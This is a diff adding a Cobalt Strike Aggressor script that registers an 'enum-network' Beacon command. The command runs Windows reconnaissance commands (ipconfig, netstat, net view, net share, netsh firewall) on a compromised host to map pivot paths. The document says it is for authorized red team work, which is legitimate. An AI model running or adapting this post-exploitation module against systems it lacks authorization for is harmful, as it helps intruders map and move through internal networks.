@@ -1,0 +1,53 @@
+#
+# network-enum.cna - Network and connectivity enumeration
+#
+# Registers the `enum-network` Beacon alias. Maps interfaces, routes,
+# connections, listening services, DNS, shares, and ARP cache so the
+# operator can identify pivot paths and internal topology.
+#
+# FOR USE ON AUTHORIZED RED TEAM ENGAGEMENTS ONLY.
+#
+
+sub enum_network {
+    local('$bid @cmds');
+    $bid = $1;
+
+    enum_log($bid, "network enumeration starting");
+
+    @cmds = @(
+        "ipconfig /all",
+        "route print",
+        "arp -a",
+        "netstat -ano",
+        "netstat -r",
+        "nslookup %LOGONSERVER%",
+        "net view",
+        "net view /domain",
+        "net share",
+        "net use",
+        "wmic nicconfig get ipaddress,macaddress,dnsdomain",
+        "netsh firewall show state",
+        "netsh advfirewall show allprofiles state"
+    );
+
+    enum_run_each($bid, @cmds);
+    enum_log($bid, "network enumeration queued");
+}
+
+alias enum-network {
+    enum_network($1);
+}
+
+beacon_command_register(
+    "enum-network",
+    "Network topology and connectivity enumeration",
+    "Synopsis: enum-network\n\n" .
+    "Maps the network context of the compromised host:\n" .
+    "  ipconfig /all            - all interface details + DNS config\n" .
+    "  route print / arp -a     - routing table and ARP cache\n" .
+    "  netstat -ano             - established/listening connections + PIDs\n" .
+    "  net view / net share     - visible hosts and exposed shares\n" .
+    "  net use                  - mapped drives / authenticated sessions\n" .
+    "  netsh firewall           - firewall state (legacy + advanced profiles)\n\n" .
+    "No binaries are dropped. Runs via cmd.exe through the current Beacon."
+);
